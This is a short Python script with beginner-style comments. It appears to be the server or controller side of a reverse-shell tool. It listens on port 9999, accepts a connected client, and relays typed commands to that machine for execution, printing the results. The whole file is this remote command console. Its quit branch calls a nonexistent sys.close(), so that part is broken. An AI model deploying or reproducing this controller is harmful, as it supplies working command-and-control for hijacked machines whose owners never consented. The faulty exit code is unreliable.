import socket  # a way two computer connected to each other
import sys  # run command lines in python


# create a socket (allows two computer to connect)


def socket_create():
    try:
        global host  # 3 variables
        global port  # a way computer can identify what data is coming in. like 8080 or 3000
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(f'Socket creation error: {msg}')

# bind socket to port and wait for connection from client


def socket_bind():
    try:
        global host
        global port
        global s
        print(f'Binding socket to port {port}')
        s.bind((host, port))
        # listen allows server to accept connection, 5 the number of back connetions before refusing new connections
        s.listen(5)
    except socket.error as msg:
        print(f'Socket binding error: {msg} \n Retrying...')
        socket_bind()  # try again until success

# establish connection with client (socket must be listening for them)


def socket_accept():
    conn, address = s.accept()
    print(
        f'Connection has been established | IP {address[0]} | Port {address[1]}')
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()  # our input
        if cmd == "quit":
            conn.close()
            s.close()
            sys.close()
        if len(str.encode(cmd)) > 0:  # sending through a network need to be byte
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")  # don't make a new line


def main():
    socket_create()
    socket_bind()
    socket_accept()


if __name__ == "__main__":
    main()
